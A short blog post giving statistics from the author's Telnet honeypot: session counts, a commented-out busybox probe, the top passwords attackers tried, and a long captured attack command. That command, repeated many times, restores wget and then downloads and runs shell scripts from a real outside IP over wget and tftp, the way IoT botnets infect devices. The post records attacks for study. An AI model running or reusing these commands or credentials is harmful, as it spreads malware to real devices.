---
published: true
title: Some (fun) stats from a running Telnet honeypot (YAFH)
layout: post
---

Telnet sessions:
```
netstat -peanut | grep 23 | grep ESTABLISHED | wc -l
185
```
<br>

Total connection recieved last month:
```
grep CONNECTION yafh-telnet.log  | wc -l
644
```

<br>

Most common wget/busybox attempt (Dont run it...i implemented accidental copy-pasta protection here #):<br>
```
# /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; 
```

<br>

Top 15 password used (The honeypot was designed to allow any password access):
```
 <empty> 
 1234
 password
 admin
 12345
 1234
 Win1doW$
 user
 pass
 aquario (??Really??)
 admin
 888888
 7ujMko0admin
 666666
 5up
 54321
 1234567890
 123456
 1111
 12345
```

One-liner of the year goes to:
```
cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin
wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin
wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin
wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bincd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wget;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://165.227.121.222/bin.sh; sh bin.sh; wget1 http://165.227.121.222/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 165.227.121.222; sh tftp.sh; tftp 165.227.121.222 -c get tftp2.sh; sh tftp2.sh;mv /bin/wget /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bin
```


What really surprises me on these stats are the constant active sessions (185) that these C2s are keeping on telnet devices even if the device is a fake honeypot that records any command. <br>
I'm still looking for a cool wget to analyze and have fun in a sandboxed enviroment but till today only old wgets and common commands are getting into the honeypot. <br>
<br><br>
Link to project: https://github.com/fnzv/YAFH

